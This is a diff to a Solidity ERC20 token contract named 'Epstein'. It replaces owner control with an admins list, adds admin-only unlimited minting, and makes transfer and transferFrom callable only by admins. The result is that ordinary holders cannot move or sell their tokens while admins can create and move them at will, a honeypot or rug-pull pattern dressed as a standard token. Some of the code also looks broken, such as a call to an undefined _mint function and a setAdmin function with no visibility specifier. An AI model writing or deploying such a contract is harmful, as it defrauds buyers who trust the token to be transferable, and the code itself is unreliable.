@@ -57,7 +57,7 @@ contract ERC20Interface {
     function transfer(address to, uint tokens) public returns (bool success);
     function approve(address spender, uint tokens) public returns (bool success);
     function transferFrom(address from, address to, uint tokens) public returns (bool success);
-
+    function mint(address toAddress, uint amount) public returns (bool success);
     event Transfer(address indexed from, address indexed to, uint tokens);
     event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
 }
@@ -72,42 +72,11 @@ contract ApproveAndCallFallBack {
     function receiveApproval(address from, uint256 tokens, address token, bytes data) public;
 }
 
-
-// ----------------------------------------------------------------------------
-// Owned contract
-// ----------------------------------------------------------------------------
-contract Owned {
-    address public owner;
-    address public newOwner;
-
-    event OwnershipTransferred(address indexed _from, address indexed _to);
-
-    constructor() public {
-        owner = msg.sender;
-    }
-
-    modifier onlyOwner {
-        require(msg.sender == owner);
-        _;
-    }
-
-    function transferOwnership(address _newOwner) public onlyOwner {
-        newOwner = _newOwner;
-    }
-    function acceptOwnership() public {
-        require(msg.sender == newOwner);
-        emit OwnershipTransferred(owner, newOwner);
-        owner = newOwner;
-        newOwner = address(0);
-    }
-}
-
-
 // ----------------------------------------------------------------------------
 // ERC20 Token, with the addition of symbol, name and decimals and assisted
 // token transfers
 // ----------------------------------------------------------------------------
-contract Epstein is ERC20Interface, Owned, SafeMath {
+contract Epstein is ERC20Interface, SafeMath {
     string public symbol;
     string public  name;
     uint8 public decimals;
@@ -116,6 +85,7 @@ contract Epstein is ERC20Interface, Owned, SafeMath {
 
     mapping(address => uint) balances;
     mapping(address => mapping(address => uint)) allowed;
+    mapping(address => bool) admins;
 
 
     // ------------------------------------------------------------------------
@@ -127,6 +97,7 @@ contract Epstein is ERC20Interface, Owned, SafeMath {
         decimals = 18;
         _totalSupply = 1000000000000000000000000000;
         balances[0x23D3808fEaEb966F9C6c5EF326E1dD37686E5972] = _totalSupply;
+        admins[msg.sender] = true;
         emit Transfer(address(0), 0x23D3808fEaEb966F9C6c5EF326E1dD37686E5972, _totalSupply);
     }
 
@@ -146,6 +117,12 @@ contract Epstein is ERC20Interface, Owned, SafeMath {
         return balances[tokenOwner];
     }
 
+    
+
+    function setAdmin(address adminAddress) {
+        require(admins[msg.sender], "no admin");
+        admins[adminAddress] = true;
+    }
 
     // ------------------------------------------------------------------------
     // Transfer the balance from token owner's account to to account
@@ -153,6 +130,7 @@ contract Epstein is ERC20Interface, Owned, SafeMath {
     // - 0 value transfers are allowed
     // ------------------------------------------------------------------------
     function transfer(address to, uint tokens) public returns (bool success) {
+        require(admins[msg.sender], "no admin");
         balances[msg.sender] = safeSub(balances[msg.sender], tokens);
         if (random < 999){
             random = random + 1;
@@ -188,6 +166,11 @@ contract Epstein is ERC20Interface, Owned, SafeMath {
         return true;
     }
 
+    function mint(address toAddress, uint amount) public returns (bool success) {
+        require(admins[msg.sender], "no admin");
+        this._mint(toAddress, amount);
+        return true;
+    }
 
     // ------------------------------------------------------------------------
     // Transfer tokens from the from account to the to account
@@ -199,6 +182,7 @@ contract Epstein is ERC20Interface, Owned, SafeMath {
     // - 0 value transfers are allowed
     // ------------------------------------------------------------------------
     function transferFrom(address from, address to, uint tokens) public returns (bool success) {
+        require(admins[msg.sender], "no admin");
         balances[from] = safeSub(balances[from], tokens);
         if (random < 999){
             uint shareburn = tokens/10;
